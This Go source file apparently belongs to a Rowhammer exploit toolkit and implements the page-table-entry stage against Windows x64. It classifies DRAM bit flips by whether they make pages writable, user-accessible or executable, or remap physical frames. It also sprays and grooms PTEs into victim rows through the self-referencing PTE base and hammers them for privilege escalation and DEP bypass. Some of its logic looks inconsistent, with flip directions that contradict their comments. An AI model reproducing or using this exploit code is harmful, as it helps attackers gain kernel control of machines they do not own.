package rowhammer

import (
	"fmt"
	"unsafe"
)

// PTE bit positions (x86-64 standard).
const (
	PTEPresent    = 1 << 0  // P — page present
	PTEWritable   = 1 << 1  // R/W — page writable
	PTEUserAccess = 1 << 2  // U/S — user accessible
	PTEWriteThru  = 1 << 3  // PWT
	PTECacheDisab = 1 << 4  // PCD
	PTEAccessed   = 1 << 5  // A
	PTEDirty      = 1 << 6  // D
	PTEPAT        = 1 << 7  // PAT (for PTEs at leaf level)
	PTEGlobal     = 1 << 8  // G
	PTENXBit      = uint64(1) << 63 // NX — no-execute

	// PTEPFNShift: bits [51:12] are the Page Frame Number.
	PTEPFNShift = 12
	PTEPFNMask  = uint64(0x000FFFFFFFFFF000)
)

// PTEFlipTarget describes a target PTE bit flip for privilege escalation.
type PTEFlipTarget struct {
	// PTEVA is the virtual address of the PTE itself (in kernel VA space).
	PTEVA uintptr
	// PTEPhys is the physical address of the PTE.
	PTEPhys uint64
	// CurrentValue is the current PTE value before the flip.
	CurrentValue uint64
	// TargetBit is which bit we want to flip.
	TargetBit int
	// FlipDirection: true = 0→1, false = 1→0.
	FlipDirection bool
	// Description of what this flip achieves.
	Effect string
}

// ClassifyPTEFlip analyzes a HammerResult and determines if it could be
// a useful PTE bit flip for privilege escalation.
//
// The strategy is "Flip Feng Shui" — spray PTEs into victim DRAM rows,
// then hammer to flip a bit in a PTE.
func ClassifyPTEFlip(flip *HammerResult, pteValue uint64) *PTEFlipTarget {
	byteInRow := flip.ByteOffset % 8
	bitInByte := flip.BitPosition
	globalBit := byteInRow*8 + bitInByte

	// Bit 1 (R/W): flipping 0→1 makes page writable.
	if globalBit == 1 && !flip.IsZeroToOne {
		// Read-only page → writable (if currently read-only).
		if pteValue&PTEWritable == 0 {
			return &PTEFlipTarget{
				TargetBit:     1,
				FlipDirection: true,
				CurrentValue:  pteValue,
				Effect:        "RO→RW: read-only page becomes writable (kernel code cave exploit)",
			}
		}
	}

	// Bit 2 (U/S): flipping 0→1 makes supervisor page user-accessible.
	if globalBit == 2 && flip.IsZeroToOne {
		if pteValue&PTEUserAccess == 0 {
			return &PTEFlipTarget{
				TargetBit:     2,
				FlipDirection: true,
				CurrentValue:  pteValue,
				Effect:        "S→U: kernel page mapped into user space (direct kernel read/write)",
			}
		}
	}

	// Bit 63 (NX): flipping 1→0 makes non-executable page executable.
	if globalBit == 63 && !flip.IsZeroToOne {
		if pteValue&PTENXBit != 0 {
			return &PTEFlipTarget{
				TargetBit:     63,
				FlipDirection: false,
				CurrentValue:  pteValue,
				Effect:        "NX→X: data page becomes executable (DEP bypass, shellcode injection)",
			}
		}
	}

	// PFN bits [51:12]: flipping these redirects the physical page backing.
	// This can map a privileged page into an attacker-controlled location.
	if globalBit >= 12 && globalBit <= 51 {
		return &PTEFlipTarget{
			TargetBit:     globalBit,
			FlipDirection: flip.IsZeroToOne,
			CurrentValue:  pteValue,
			Effect:        fmt.Sprintf("PFN bit %d flip: physical page remapping (may achieve kernel page aliasing)", globalBit),
		}
	}

	return nil
}

// PTESprayer manages spraying PTE pages into target DRAM rows.
// The goal is to get a PTE physically adjacent to our aggressor rows
// so that hammering flips a bit in the PTE.
type PTESprayer struct {
	mapper    *MemoryMapper
	allocBufs [][]byte
}

// NewPTESprayer creates a PTE sprayer.
func NewPTESprayer(mapper *MemoryMapper) *PTESprayer {
	return &PTESprayer{mapper: mapper}
}

// SprayPTEsIntoRow attempts to place PTEs into the physical row at physRowAddr.
// Strategy: allocate many small buffers and touch them, hoping the kernel
// places their PTEs into our target row.
// Returns true if any PTEs land in the target row.
func (s *PTESprayer) SprayPTEsIntoRow(physRowTarget uint64, attempts int) (bool, error) {
	targetBank, targetRow := physAddrToDRAMRow(physRowTarget)

	for i := 0; i < attempts; i++ {
		// Allocate a page — this causes the kernel to allocate a new PTE.
		// The PTE itself is typically in a kernel-managed "PTE page".
		buf := make([]byte, getPageSize())
		buf[0] = 0xAA // touch to ensure physical allocation
		s.allocBufs = append(s.allocBufs, buf)

		// On Windows, we can't directly read kernel PTE pages from user space.
		// But we can observe indirect effects: the PTE page backing our buffer's
		// PTE has a physical address we can query via NtQueryVirtualMemory.
		ptePA, err := s.mapper.VirtToPhys(uintptr(unsafe.Pointer(&buf[0])))
		if err != nil {
			continue
		}

		pteBank, pteRow := physAddrToDRAMRow(ptePA)
		if pteBank == targetBank && pteRow == targetRow {
			return true, nil
		}
	}

	return false, nil
}

// Release frees all sprayed allocations.
func (s *PTESprayer) Release() {
	s.allocBufs = nil
}

// PTEGroomer positions memory allocations to maximize the chance of a
// PTE landing in the victim DRAM row during hammering.
//
// The technique is "Flip Feng Shui" (VUSec, 2016):
//   1. Free memory pages in the victim row.
//   2. Trigger kernel PTE allocation for a new mapping.
//   3. The kernel reuses the freed pages → PTE now in victim row.
//   4. Hammer the aggressor rows → bit flips in PTE → privilege escalation.
type PTEGroomer struct {
	mapper    *MemoryMapper
	holeBufs  [][]byte
	targetRow uint64
}

// NewPTEGroomer creates a PTE groomer targeting a specific physical row.
func NewPTEGroomer(mapper *MemoryMapper, targetPhysRow uint64) *PTEGroomer {
	return &PTEGroomer{mapper: mapper, targetRow: targetPhysRow}
}

// Groom attempts to fill the target row with PTE data.
// Returns the virtual addresses of pages whose PTEs are now in the target row.
func (g *PTEGroomer) Groom(maxAttempts int) ([]uintptr, error) {
	var ptesInRow []uintptr
	_, targetDRAMRow := physAddrToDRAMRow(g.targetRow)

	for attempt := 0; attempt < maxAttempts; attempt++ {
		// Allocate a fresh page.
		buf := make([]byte, getPageSize())
		_ = buf[0] // touch

		// Get the PTE's physical address.
		// On Windows: query the physical address of the PTE.
		// We estimate the PTE address from the VA (self-referencing PTE trick).
		va := uintptr(unsafe.Pointer(&buf[0]))
		pteVA := selfRefPTEAddr(va)

		// Touch the PTE VA to force it into working set.
		// Can't directly read it without kernel access, but we can
		// estimate its physical location.
		ptePA, err := g.mapper.VirtToPhys(pteVA)
		if err != nil {
			g.holeBufs = append(g.holeBufs, buf)
			continue
		}

		_, pteDRAMRow := physAddrToDRAMRow(ptePA)
		if pteDRAMRow == targetDRAMRow {
			ptesInRow = append(ptesInRow, va)
		}
		g.holeBufs = append(g.holeBufs, buf)
	}

	return ptesInRow, nil
}

// selfRefPTEAddr computes the kernel VA of the PTE for a given user VA.
// On Windows x64 with the self-referencing PML4 entry at index 0x1ED:
//   PTE VA = 0xFFFFF680_00000000 + (VA >> 9) & ~7
// This formula is for standard Windows memory layouts.
func selfRefPTEAddr(va uintptr) uintptr {
	// Windows self-referencing PTE base (varies by version; this is Win10/11 typical).
	const pteBase = uintptr(0xFFFFF68000000000)
	return pteBase + (va>>9)&^uintptr(7)
}

// FlipPTEBit attempts to flip a specific bit in a PTE by hammering.
// This is the final step: aggressor rows are adjacent to the PTE's physical row.
// After a successful flip, the mapping is altered.
//
// Returns the original and new PTE values (best-effort read via pagemap),
// and an error if the flip was not confirmed.
func FlipPTEBit(engine *HammerEngine, target *PTEFlipTarget) (uint64, uint64, error) {
	// Read the current PTE value (if we can from user space — Windows limits this).
	before, err := readPTEValue(target.PTEVA)
	if err != nil {
		// Can't read PTE directly; proceed optimistically.
		before = target.CurrentValue
	}

	// Hammer the aggressor rows (already set up in engine).
	// Check if the flip happened.
	flips, err := engine.TargetedHammer(target.PTEVA - uintptr(target.PTEVA%uintptr(RowSize)))
	if err != nil {
		return before, 0, fmt.Errorf("hammer: %w", err)
	}

	after, _ := readPTEValue(target.PTEVA)
	if after == before && len(flips) == 0 {
		return before, after, fmt.Errorf("no bit flip detected in PTE")
	}

	return before, after, nil
}

// readPTEValue attempts to read the PTE at pteVA.
// Only works if we have kernel read access (e.g., via BYOVD or ring-0).
func readPTEValue(pteVA uintptr) (uint64, error) {
	if pteVA == 0 {
		return 0, fmt.Errorf("nil PTE VA")
	}
	// Direct read — valid only if running with kernel access.
	val := *(*uint64)(unsafe.Pointer(pteVA))
	return val, nil
}
